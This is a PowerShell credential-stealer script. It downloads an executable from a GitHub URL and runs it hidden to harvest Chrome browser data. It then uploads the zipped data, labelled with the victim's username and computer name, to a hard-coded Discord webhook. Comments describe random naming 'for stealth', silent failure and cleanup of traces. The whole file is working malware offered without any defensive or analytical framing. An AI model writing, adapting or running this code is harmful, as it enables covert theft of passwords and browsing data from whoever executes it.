# === Configuration ===
# Target Discord Webhook URL for data exfiltration
$WebhookUrl = "https://discordapp.com/api/webhooks/1446441437989310474/CWXXATEjkhEJ2gGQq6Bv8BAVryJnukZBTlLQmV3YQpjDMTsiNxNo2pN3UlkNgvlV8xbW"
# URL of the file to download
$PayloadUri = "https://github.com/5hank4r/pass/raw/refs/heads/main/sa.exe"
# ---

# Working directory (where the script is executed)
$CWD = (Get-Location).Path

# Generate a random 12-character name for stealth
$RandomName = (-join ((65..90) + (97..122) | Get-Random -Count 12 | ForEach-Object {[char]$_})) + ".exe"
$ExePath = Join-Path -Path $CWD -ChildPath $RandomName
$ZipPath = Join-Path -Path $CWD -ChildPath "pass\pass.zip"

# --- 1. DOWNLOAD PAYLOAD ---

try {
    Invoke-WebRequest -Uri $PayloadUri -OutFile $ExePath -UseBasicParsing -ErrorAction Stop
}
catch {
    # Fail silently if download is blocked/fails
    exit
}

# --- 2. EXECUTE PAYLOAD AND WAIT FOR DATA ---

# Arguments: collect Chrome data (-b chrome) into a folder named 'pass' (-dir pass) then zip it (-zip)
# -Wait ensures the script pauses until the payload finishes execution.
# -NoNewWindow is removed to avoid the conflict with -WindowStyle Hidden.
Start-Process -FilePath $ExePath -ArgumentList "-b chrome -dir pass -zip" -Wait -WindowStyle Hidden

# Give a minor buffer for file I/O to complete
Start-Sleep -Seconds 2

# --- 3. EXFILTRATE DATA VIA WEBHOOK ---

if (Test-Path $ZipPath) {
    try {
        # Generate headers and boundary for multipart/form-data
        $Boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"
        $FileInfo = Get-Item $ZipPath
        
        # --- Build Message Content Part ---
        # The content part of the Discord message (text message)
        $ContentHeader = "--$Boundary" + $LF
        $ContentHeader += "Content-Disposition: form-data; name=`"content`"" + $LF + $LF
        $ContentMessage = "Chrome data received from $env:USERNAME on $env:COMPUTERNAME" + $LF + $LF
        
        # --- Build File Attachment Part ---
        # The file part of the Discord message
        $FileHeader = "--$Boundary" + $LF
        $FileHeader += "Content-Disposition: form-data; name=`"file`"; filename=`"pass.zip`"" + $LF
        $FileHeader += "Content-Type: application/zip" + $LF + $LF
        $Footer = $LF + "--$Boundary--" + $LF
        
        # Convert header strings to bytes
        $ContentHeaderBytes  = [System.Text.Encoding]::UTF8.GetBytes($ContentHeader)
        $ContentMessageBytes = [System.Text.Encoding]::UTF8.GetBytes($ContentMessage)
        $FileHeaderBytes     = [System.Text.Encoding]::UTF8.GetBytes($FileHeader)
        $FooterBytes         = [System.Text.Encoding]::UTF8.GetBytes($Footer)

        # Read the file content as raw bytes
        $FileBytes = [System.IO.File]::ReadAllBytes($FileInfo.FullName)

        # Combine all parts into a single byte array
        $TotalLength = $ContentHeaderBytes.Length + $ContentMessageBytes.Length + $FileHeaderBytes.Length + $FileBytes.Length + $FooterBytes.Length
        $AllBytes = New-Object byte[] ($TotalLength)
        
        $Offset = 0
        $ContentHeaderBytes.CopyTo($AllBytes, $Offset); $Offset += $ContentHeaderBytes.Length
        $ContentMessageBytes.CopyTo($AllBytes, $Offset); $Offset += $ContentMessageBytes.Length
        $FileHeaderBytes.CopyTo($AllBytes, $Offset); $Offset += $FileHeaderBytes.Length
        $FileBytes.CopyTo($AllBytes, $Offset); $Offset += $FileBytes.Length
        $FooterBytes.CopyTo($AllBytes, $Offset)

        # Use .NET WebClient for high-compatibility file upload
        $WebClient = New-Object System.Net.WebClient
        $WebClient.Headers.Add("Content-Type", "multipart/form-data; boundary=`"$Boundary`"")
        $WebClient.UploadData($WebhookUrl, "POST", $AllBytes)
    }
    catch {
        # Suppress any upload error (e.g., 401 Unauthorized) to maintain stealth
    }
}

# --- 4. CLEANUP (Guaranteed to run) ---

# Remove the random executable
Remove-Item $ExePath -Force -ErrorAction SilentlyContinue

# Remove the 'pass' directory and its contents
Remove-Item (Join-Path -Path $CWD -ChildPath "pass") -Recurse -Force -ErrorAction SilentlyContinue

# The script exits silently at the end.
